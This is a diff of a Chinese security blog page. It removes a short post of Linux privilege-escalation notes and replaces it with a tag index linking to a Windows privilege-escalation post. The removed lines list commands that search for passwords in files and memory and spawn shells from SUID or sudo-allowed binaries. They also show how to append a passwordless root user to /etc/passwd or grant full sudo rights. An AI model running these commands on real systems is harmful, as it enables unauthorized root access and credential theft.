@@ -17,23 +17,10 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>心上人是心上人</title>
+  <title>Tags - 命令提权(at、sc) - 心上人是心上人</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
-
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
-  
-    
-    
-      
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
-    
-  
-
-  
 
 
 <!-- 主题依赖的图标库，不要自行修改 -->
@@ -56,7 +43,7 @@
 
 
 <body>
-  <header style="height: 70vh;">
+  <header style="height: 100vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -150,7 +137,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/1.png') no-repeat center center;
+         style="background: url('/img/4.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -160,45 +147,12 @@
             </span>
 
             
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-11-19 15:12" pubdate>
-        November 19, 2020 pm
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      436 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      5
-       分钟
-    </span>
-  
-
-  
-  
-</div>
-
-            
           </div>
 
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
           
         </div>
       </div>
@@ -207,122 +161,37 @@
 
   <main>
     
+      <div class="container nopadding-md">
+        <div class="py-5" id="board"
+          style=margin-top:0>
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+<div class="list-group">
+  <p class="h4">1 posts in total.</p>
+  <hr>
+  
+    
       
-
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto" id="post">
-            <!-- SEO header -->
-            <h1 style="display: none"></h1>
-            
-            <div class="markdown-body" id="post-body">
-              <p>title: linux提权(普通用户–&gt;root)<br>tags:</p>
-<ul>
-<li><p>密码相关操作进行提权</p>
-</li>
-<li><p>计划任务 corn进行提权</p>
-</li>
-<li><p>内核漏洞提权</p>
-</li>
-<li><p>sudo提权</p>
-</li>
-<li><p>suid提权                                                                 </p>
-</li>
-<li><p>利用可写文件提权</p>
-</li>
-<li><p>敏感组提权</p>
-<p>categories:</p>
-</li>
-<li><p>内网安全<br>date: 2020-10-04 14:38:00</p>
-</li>
-</ul>
-<!-- 
+      <p class="h5">2020</p>
+    
+    <a href="/2020/10/04/windows%E6%8F%90%E6%9D%83/" class="list-group-item list-group-item-action">
+      <span class="archive-post-title">windows提权</span>
+      <time style="float: right;">10-04</time>
+    </a>
+  
+</div>
 
 
 
-
- -->
-
-<h2 id="1-密码相关操作"><a href="#1-密码相关操作" class="headerlink" title="1.密码相关操作"></a>1.密码相关操作</h2><h3 id="1-查找带有密码相关的文件"><a href="#1-查找带有密码相关的文件" class="headerlink" title="1.查找带有密码相关的文件"></a>1.查找带有密码相关的文件</h3><p>grep –color=auto -rnw ‘/‘ -ie  “PASSWORD” –color=always 2&gt; /dev/null</p>
-<h3 id="2-查看过期的密码"><a href="#2-查看过期的密码" class="headerlink" title="2.查看过期的密码"></a>2.查看过期的密码</h3><p>/etc/security/opasswd</p>
-<p>id：查看权限</p>
-<h3 id="3-查看用户最后编辑的文件"><a href="#3-查看用户最后编辑的文件" class="headerlink" title="3.查看用户最后编辑的文件"></a>3.查看用户最后编辑的文件</h3><p>find / -mmin -10 2&gt;/dev/null |grep -Ev “^/proc”</p>
-<h3 id="4-查看内存中密码"><a href="#4-查看内存中密码" class="headerlink" title="4.查看内存中密码"></a>4.查看内存中密码</h3><p>strings /dev/mem -n10 | grep -i pass</p>
-<h3 id="5-查找敏感文件"><a href="#5-查找敏感文件" class="headerlink" title="5.查找敏感文件"></a>5.查找敏感文件</h3><p>locate password | more</p>
-<h2 id="2-计划任务cron"><a href="#2-计划任务cron" class="headerlink" title="2.计划任务cron"></a>2.计划任务cron</h2><p>查看计划任务：cat /var/log/cronlog</p>
-<p>编辑计划任务：/etc/crontab</p>
-<h2 id="3-内核漏洞：exp"><a href="#3-内核漏洞：exp" class="headerlink" title="3.内核漏洞：exp"></a>3.内核漏洞：exp</h2><p>uname -a：查看Linux内核版本</p>
-<p>工具：linux-exploit-suggester，可以识别当前系统的内核版本以及架构并且尝试查找可以利用的exp</p>
-<p>Linux_Exploit_Suggester同上类似</p>
-<p>gcc提权：cnblogs.com/glowing-z/p/11442149.html</p>
-<h2 id="4-sudo提权"><a href="#4-sudo提权" class="headerlink" title="4.sudo提权"></a>4.sudo提权</h2><p>sudo -l：显示当前用户所支持的命令</p>
-<p>若显示mysql，则输入以下命令提权：sudo mysql -e ‘! /bin/sh’</p>
-<h2 id="5-suid提权"><a href="#5-suid提权" class="headerlink" title="5.suid提权"></a>5.suid提权</h2><p>suid，代表执行时设置的用户id</p>
-<p>查看具有suid权限的文件：find / -user root -perm -4000 -print 2&gt;/dev/null</p>
-<p>常见的可以用suid提权</p>
-<p>nmap：2.02–5.21   ：namp&gt; !sh获取shell</p>
-<p>vim：vim -c ‘!sh’</p>
-<p>GTFOBins：gtfobins.github.io</p>
-<h2 id="6-利用可写文件提权"><a href="#6-利用可写文件提权" class="headerlink" title="6.利用可写文件提权"></a>6.利用可写文件提权</h2><p>/etc/passwd可写</p>
-<p>写入一个新用户：echo ‘dummp::0::0::/root:/bin/bash’&gt;&gt;/etc/passwd</p>
-<p>/etc/sudoers可写</p>
-<p>写一个新用户可用sudo执行任何命令：echo “用户名 ALL=(ALL:ALL)ALL”&gt;&gt;/etc/sudoers</p>
-<h2 id="7-敏感组提权"><a href="#7-敏感组提权" class="headerlink" title="7.敏感组提权"></a>7.敏感组提权</h2><p>docker权限设置不是很规范(但是现在docker安装默认权限很低)</p>
-
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                
               </div>
-              
-                <p class="note note-warning">转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2020/10/04/windows%E5%9F%BA%E7%A1%80/">
-                        <span class="hidden-mobile">windows基础</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
             </div>
-
-            
-          </article>
+          </div>
         </div>
       </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
-  <div id="tocbot"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-
     
   </main>
 
@@ -404,31 +273,6 @@
 
 
 
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
-
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '#post-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
-    });
-  </script>
-
 
 
   <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
@@ -436,7 +280,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "&nbsp;",
+        "Tag - 命令提权(at、sc)&nbsp;",
       ],
       cursorChar: "",
       typeSpeed: 100,
@@ -451,21 +295,6 @@
 
 
 
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
 
 
   <script  src="/js/local-search.js" ></script>
@@ -479,20 +308,6 @@
   </script>
 
 
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
 
 
 
